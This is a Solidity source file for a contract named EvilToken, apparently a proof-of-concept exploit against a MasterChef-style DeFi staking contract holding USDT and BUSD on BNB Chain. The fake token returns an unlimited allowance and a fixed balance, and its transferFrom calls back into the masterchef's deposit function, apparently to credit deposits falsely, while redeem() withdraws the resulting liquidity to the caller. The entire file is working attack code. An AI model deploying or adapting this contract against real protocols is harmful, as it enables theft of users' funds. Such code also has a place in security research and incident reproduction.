// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "./IMasterChef.sol";
import "./IERC20.sol";

contract EvilToken {
    IMasterChef masterchef;
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    constructor(IMasterChef _masterchef) {
        masterchef = _masterchef;
    }


    function allowance(address owner, address spender) external view returns (uint256){
        return 2**256-1;
    }
    function balanceOf(address account) external view returns (uint256){
        return 1111;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool){
        if(address(masterchef)!=address(0) && address(msg.sender)!=address(masterchef)){
            usdt.approve(address(masterchef),2**256-1);
            busd.approve(address(masterchef),2**256-1);
            masterchef.depositByAddLiquidity(18,[address(usdt),address(busd)],[usdt.balanceOf(address(this)),busd.balanceOf(address(this))]);
        }
        return true;
    }

    function redeem() external{
        (uint256 _amount,) = masterchef.userInfo(18,address(this));
        masterchef.withdrawAndRemoveLiquidity(18,_amount,false);
        usdt.transfer(msg.sender,usdt.balanceOf(address(this)));
        busd.transfer(msg.sender,busd.balanceOf(address(this)));

    }
}
